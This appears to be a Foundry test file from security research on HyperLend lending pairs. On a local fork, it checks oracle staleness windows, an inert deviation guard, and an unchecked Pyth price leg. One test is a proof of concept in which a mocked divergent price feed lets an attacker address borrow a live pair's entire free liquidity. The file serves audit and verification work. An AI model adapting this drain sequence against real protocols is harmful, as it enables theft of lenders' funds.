// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// @title HyperLend isolated pairs — oracle staleness / dual-oracle verification (ZH4-PASS7 TIER3 #3)
/// @notice READ-ONLY research. All state changes happen on a LOCAL FORK only. No mainnet tx is ever sent.
///         Fork = HyperEVM (chainId 999) via a KEYLESS public RPC.
///         The test proves:
///           (1) the live config (maxOracleDelay 7d / 70d),
///           (2) that the outer OracleChainlink staleness bound is the ONLY freshness guard
///               (mock a feed to be 6d old -> accepted; 8d old -> revert "invalid oracle price"),
///           (3) that the Pyth leg (getPriceUnsafe) has NO Pyth-level freshness: a 60d-old
///               Pyth publishTime is still accepted under the 70d maxOracleDelay,
///           (4) that the deviation guard is INERT because OracleChainlink returns low==high,
///           (5) the *mechanism*: if a feed ever diverges, an unprivileged attacker can borrow the
///               entire free liquidity of the pair (latent; requires a divergent feed, not live today).

interface IPair {
    function asset() external view returns (address);
    function collateralContract() external view returns (address);
    function maxLTV() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function totalAsset() external view returns (uint128 amount, uint128 shares);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function totalCollateral() external view returns (uint256);
    function exchangeRateInfo()
        external
        view
        returns (address oracle, uint32 maxOracleDeviation, uint184 lastTimestamp, uint256 low, uint256 high);
    function updateExchangeRate() external returns (bool, uint256, uint256);
    function addCollateral(uint256 amount, address borrower) external;
    function borrowAsset(uint256 amount, uint256 collateral, address receiver) external returns (uint256);
}

interface IOracle {
    function maxOracleDelay() external view returns (uint256);
    function oracleType() external view returns (uint256);
    function getPrices() external view returns (bool isBadData, uint256 low, uint256 high);
    function CHAINLINK_MULTIPLY_ADDRESS() external view returns (address);
    function CHAINLINK_DIVIDE_ADDRESS() external view returns (address);
}

interface IFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

contract HyperlendPairsTest is Test {
    // ---- HyperEVM mainnet addresses (verified on-chain) ----
    address constant PAIR_WHLP_USDT0 = 0x06Fd9D03b3d0F18E4919919b72D30c582f0a97E5; // asset USDT0 / collat WHLP
    address constant PAIR_XHYPE_USDT0 = 0xb8fEC5F81Bc7bE9dd5f9bc6De8E34E244A726d2F; // asset USDT0 / collat xHYPE (FROZEN)
    address constant PAIR_XHYPE_USDC = 0x78DD09e369f35D033a1d4ec1df39BC8a51c8B6fd; // asset USDC  / collat xHYPE
    address constant PAIR_KMHYPE_WHYPE = 0x9465c9218668b54939A7e09467d1DFf9d8704882; // asset WHYPE / collat kmHYPE

    address constant ORACLE_WHLP = 0x70f27F1a21E7116F76a3AF17577157c6B743619E; // "WHLP(native)-USDT(RedStone)"
    address constant ORACLE_XHYPE_USDT0 = 0xd8adb3287c37053F3265a4c5f521428f7c018AB2; // "Chainlink/Pyth-USDT0-xHYPE"
    address constant ORACLE_XHYPE_USDC = 0x896970EB7FB914eFcDfaDA4CFFC3E3C31497Da5a; // "USDC(RedStone)-xHYPE(Pyth)"
    address constant ORACLE_KMHYPE = 0x8CBa4384Be277467E5955eCf1185154b867eD634; // "kmHYPE(fundamental)-HYPE(RedStone)"

    // feeds used by ORACLE_WHLP
    address constant FEED_USDT_REDSTONE = 0x5e21f6530f656A38caE4F55500944753F662D184; // multiply
    address constant FEED_WHLP_NATIVE = 0x190897a08371bE59f309dB2377832a462f003D76; // divide
    // feeds used by ORACLE_XHYPE_USDC (Pyth leg = divide)
    address constant FEED_USDC_REDSTONE = 0x4C89968338b75551243C99B452c84a01888282fD; // multiply
    address constant FEED_XHYPE_PYTH = 0x81D7FcFC2289fb137e85739ceE90E90cC5DAF206; // divide (Pyth adapter, getPriceUnsafe)
    // feeds used by ORACLE_XHYPE_USDT0 (Pyth leg = multiply, currently 127.8d stale)
    address constant FEED_PYTH_USDT0_STALE = 0x5d5EE47c6bCf6B05B2a3F65c4e37312Dc978d30D; // multiply

    address constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address constant USDC = 0xb88339CB7199b77E23DB6E890353E22632Ba630f;
    address constant WHLP = 0x1359b05241cA5076c9F59605214f4F84114c0dE8;

    uint256 constant FORK_BLOCK = 0; // 0 = latest (HyperEVM public RPC serves non-archival feed state)
    address attacker = address(0xA11CE);

    function setUp() public {
        // NOTE: do NOT use FORK_RPC_URL (that is the Ethereum probe). HyperEVM has its own keyless RPC.
        string memory rpc = vm.envOr("HYPEREVM_RPC_URL", string("https://rpc.hyperliquid.xyz/evm"));
        uint256 fb = vm.envOr("HYPEREVM_FORK_BLOCK", uint256(0));
        if (fb == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, fb);
        }
        console2.log("fork block", block.number);
        console2.log("now", block.timestamp);
    }

    function _mockFeed(address feed, int256 answer, uint256 updatedAt) internal {
        vm.mockCall(
            feed,
            abi.encodeWithSelector(IFeed.latestRoundData.selector),
            abi.encode(uint80(1), answer, updatedAt, updatedAt, uint80(1))
        );
    }

    // ---------------------------------------------------------------------------------
    // 1. Live config verification
    // ---------------------------------------------------------------------------------
    function test_live_config() public {
        uint256 d1 = IOracle(ORACLE_WHLP).maxOracleDelay();
        uint256 d2 = IOracle(ORACLE_XHYPE_USDT0).maxOracleDelay();
        uint256 d3 = IOracle(ORACLE_XHYPE_USDC).maxOracleDelay();
        uint256 d4 = IOracle(ORACLE_KMHYPE).maxOracleDelay();
        console2.log("maxOracleDelay WHLP/USDT0   ", d1);
        console2.log("maxOracleDelay xHYPE/USDT0  ", d2);
        console2.log("maxOracleDelay xHYPE/USDC   ", d3);
        console2.log("maxOracleDelay kmHYPE/WHYPE ", d4);
        assertEq(d1, 604800, "WHLP 7d");
        assertEq(d2, 604800, "xHYPE/USDT0 7d");
        assertEq(d3, 6048000, "xHYPE/USDC 70d");
        assertEq(d4, 604800, "kmHYPE 7d");

        // free liquidity per pair
        (uint128 a1, ) = IPair(PAIR_WHLP_USDT0).totalAsset();
        (uint128 b1, ) = IPair(PAIR_WHLP_USDT0).totalBorrow();
        console2.log("pair1 free USDT0", uint256(a1) - uint256(b1));
        (uint128 a3, ) = IPair(PAIR_XHYPE_USDC).totalAsset();
        (uint128 b3, ) = IPair(PAIR_XHYPE_USDC).totalBorrow();
        console2.log("pair3 free USDC ", uint256(a3) - uint256(b3));
        (uint128 a4, ) = IPair(PAIR_KMHYPE_WHYPE).totalAsset();
        (uint128 b4, ) = IPair(PAIR_KMHYPE_WHYPE).totalBorrow();
        console2.log("pair4 free WHYPE", uint256(a4) - uint256(b4));
    }

    // ---------------------------------------------------------------------------------
    // 2. The outer staleness bound is the ONLY freshness guard
    // ---------------------------------------------------------------------------------
    function test_staleness_window_7d() public {
        (, int256 ans, , , ) = IFeed(FEED_WHLP_NATIVE).latestRoundData();
        assertGt(ans, 0);
        // fresh within 7d -> accepted (getPrices must NOT revert)
        _mockFeed(FEED_WHLP_NATIVE, ans, block.timestamp - 6 days);
        bool ok6 = _tryGetPrices(ORACLE_WHLP);
        console2.log("6d-stale feed accepted?", ok6);
        assertTrue(ok6, "6d stale must be accepted");

        // just past 7d -> revert "invalid oracle price"
        _mockFeed(FEED_WHLP_NATIVE, ans, block.timestamp - 8 days);
        bool ok8 = _tryGetPrices(ORACLE_WHLP);
        console2.log("8d-stale feed accepted?", ok8);
        assertFalse(ok8, "8d stale must revert");
    }

    // ---------------------------------------------------------------------------------
    // 3. Pyth getPriceUnsafe leg has NO Pyth-level freshness (70d window)
    // ---------------------------------------------------------------------------------
    function test_pyth_leg_stale_60d_accepted() public {
        // confirm the adapter really calls getPriceUnsafe(bytes32) = 0x96834ad3
        bytes memory code = FEED_XHYPE_PYTH.code;
        assertGt(code.length, 0);
        assertTrue(_contains(code, hex"96834ad3"), "Pyth getPriceUnsafe selector present");

        (, int256 ans, , , ) = IFeed(FEED_XHYPE_PYTH).latestRoundData();
        assertGt(ans, 0);
        // Pyth publishTime 60 days old -> still accepted (<= 70d maxOracleDelay)
        _mockFeed(FEED_XHYPE_PYTH, ans, block.timestamp - 60 days);
        bool ok60 = _tryGetPrices(ORACLE_XHYPE_USDC);
        console2.log("60d-stale Pyth accepted (70d window)?", ok60);
        assertTrue(ok60, "60d stale Pyth must be accepted under 70d window");

        // 71 days -> revert
        _mockFeed(FEED_XHYPE_PYTH, ans, block.timestamp - 71 days);
        bool ok71 = _tryGetPrices(ORACLE_XHYPE_USDC);
        console2.log("71d-stale Pyth accepted?", ok71);
        assertFalse(ok71, "71d stale must revert");
    }

    // ---------------------------------------------------------------------------------
    // 4. Deviation guard is inert (low == high for a single-source oracle)
    // ---------------------------------------------------------------------------------
    function test_deviation_guard_inert() public {
        (, uint256 low, uint256 high) = IOracle(ORACLE_WHLP).getPrices();
        console2.log("low ", low);
        console2.log("high", high);
        assertEq(low, high, "OracleChainlink returns low==high -> deviation always 0");
        (address o, uint32 maxDev, , , ) = IPair(PAIR_WHLP_USDT0).exchangeRateInfo();
        console2.log("oracle", o);
        console2.log("maxOracleDeviation", maxDev);
        assertEq(uint256(maxDev), 5000);
    }

    // ---------------------------------------------------------------------------------
    // 5. MECHANISM: a divergent feed lets an unprivileged attacker drain free liquidity
    //    (LATENT — requires the feed to diverge; not live today. Fork-proven mechanism.)
    // ---------------------------------------------------------------------------------
    function test_divergent_feed_drains_free_liquidity() public {
        uint256 free = _freeLiquidity(PAIR_WHLP_USDT0);

        // Attacker acquires WHLP at its TRUE price and supplies it. Mock the divide feed to
        // report WHLP at 10x, i.e. exchangeRate = USDT/WHLP drops ~10x -> collateral overvalued.
        (, int256 whlpAns, , , ) = IFeed(FEED_WHLP_NATIVE).latestRoundData();
        _mockFeed(FEED_WHLP_NATIVE, whlpAns * 10, block.timestamp);

        // refresh the pair's cached rate so we can size the collateral against the new rate
        IPair(PAIR_WHLP_USDT0).updateExchangeRate();
        (, , , uint256 rateNew, ) = IPair(PAIR_WHLP_USDT0).exchangeRateInfo();
        console2.log("mocked exchangeRate", rateNew);

        // collateral needed for the whole free liquidity at 83% LTV: ceil(free*rate/1e18 *1e5/83000)
        uint256 collNeeded = ((free * rateNew / 1e18) * 1e5) / 83_000 + 1e6;

        deal(WHLP, attacker, collNeeded);
        vm.startPrank(attacker);
        IERC20(WHLP).approve(PAIR_WHLP_USDT0, type(uint256).max);
        uint256 before = IERC20(USDT0).balanceOf(attacker);
        uint256 shares = IPair(PAIR_WHLP_USDT0).borrowAsset(free, collNeeded, attacker);
        uint256 got = IERC20(USDT0).balanceOf(attacker) - before;
        vm.stopPrank();

        console2.log("borrowed USDT0 (6dp)", got);
        console2.log("collateral WHLP supplied (6dp)", collNeeded);
        console2.log("borrow shares", shares);
        assertEq(got, free, "attacker extracted the pair's entire free liquidity");

        // And one wei more must fail (bounded by free liquidity, not by the oracle)
        vm.prank(attacker);
        vm.expectRevert();
        IPair(PAIR_WHLP_USDT0).borrowAsset(1, collNeeded, attacker);
    }

    // ---------------------------------------------------------------------------------
    // 6. Baseline: with the REAL feed there is no free money (collateral must be >= LTV)
    // ---------------------------------------------------------------------------------
    function test_baseline_no_free_money() public {
        uint256 free = _freeLiquidity(PAIR_WHLP_USDT0);
        deal(WHLP, attacker, 100_000e6); // plenty of collateral
        vm.startPrank(attacker);
        IERC20(WHLP).approve(PAIR_WHLP_USDT0, type(uint256).max);
        // Borrowing the full free liquidity with only 100k WHLP (~$114k) at 83% LTV:
        // needs ~1.0542 WHLP per USDT0 => 11,394 USDT0 needs ~12,012 WHLP. 100k is enough.
        // The point: the attacker must lock MORE collateral value than borrowed -> no profit.
        uint256 shares = IPair(PAIR_WHLP_USDT0).borrowAsset(free, 100_000e6, attacker);
        vm.stopPrank();
        assertGt(shares, 0);
        console2.log("baseline borrow ok, shares", shares);
        console2.log("collateral WHLP locked (6dp)", uint256(100_000e6));
        console2.log("asset borrowed (6dp)", free);
    }

    // ---- helpers ----
    function _freeLiquidity(address pair) internal view returns (uint256) {
        (uint128 a, ) = IPair(pair).totalAsset();
        (uint128 b, ) = IPair(pair).totalBorrow();
        return uint256(a) - uint256(b);
    }

    function _tryGetPrices(address oracle) internal returns (bool ok) {
        try IOracle(oracle).getPrices() returns (bool, uint256, uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _contains(bytes memory hay, bytes4 needle) internal pure returns (bool) {
        bytes memory n = abi.encodePacked(needle);
        if (hay.length < n.length) return false;
        for (uint256 i = 0; i <= hay.length - n.length; i++) {
            bool m = true;
            for (uint256 j = 0; j < n.length; j++) {
                if (hay[i + j] != n[j]) {
                    m = false;
                    break;
                }
            }
            if (m) return true;
        }
        return false;
    }
}
